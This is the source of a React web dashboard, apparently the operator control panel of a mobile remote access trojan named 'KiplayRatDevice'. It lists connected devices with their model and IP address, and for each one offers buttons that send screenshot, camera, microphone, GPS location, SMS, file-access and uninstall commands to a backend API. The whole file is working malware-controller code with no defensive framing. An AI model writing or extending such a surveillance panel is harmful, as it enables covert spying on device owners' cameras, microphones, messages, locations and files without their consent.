import React, { useState, useEffect } from 'react';
import './App.css';

function App() {
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);

  useEffect(() => {
    loadDevices();
    const interval = setInterval(loadDevices, 5000);
    return () => clearInterval(interval);
  }, []);

  const loadDevices = async () => {
    const res = await fetch('/api/devices');
    const data = await res.json();
    setDevices(data);
  };

  const sendCommand = async (command) => {
    await fetch(`/api/command/${selectedDevice.id}`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({command})
    });
  };

  return (
    <div className="dashboard">
      <header>
        <h1>🎮 KiplayRatDevice Control Panel</h1>
        <div className="stats">
          <span>Online Devices: {devices.filter(d => d.online).length}</span>
        </div>
      </header>

      <div className="grid">
        <div className="devices-panel">
          <h3>Devices</h3>
          {devices.map(device => (
            <div key={device.id} className={`device ${device.online ? 'online' : 'offline'}`}
                 onClick={() => setSelectedDevice(device)}>
              <strong>{device.model}</strong><br/>
              {device.brand} | {device.ip}
            </div>
          ))}
        </div>

        <div className="control-panel">
          {selectedDevice && (
            <>
              <h3>Control: {selectedDevice.model}</h3>
              <div className="commands">
                <button onClick={() => sendCommand('screenshot')}>📸 Screenshot</button>
                <button onClick={() => sendCommand('camera')}>📱 Camera</button>
                <button onClick={() => sendCommand('mic')}>🎤 Microphone</button>
                <button onClick={() => sendCommand('gps')}>📍 Location</button>
                <button onClick={() => sendCommand('sms')}>💬 SMS</button>
                <button onClick={() => sendCommand('files')}>📁 Files</button>
                <button className="danger" onClick={() => sendCommand('uninstall')}>🗑️ Uninstall</button>
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}

export default App;
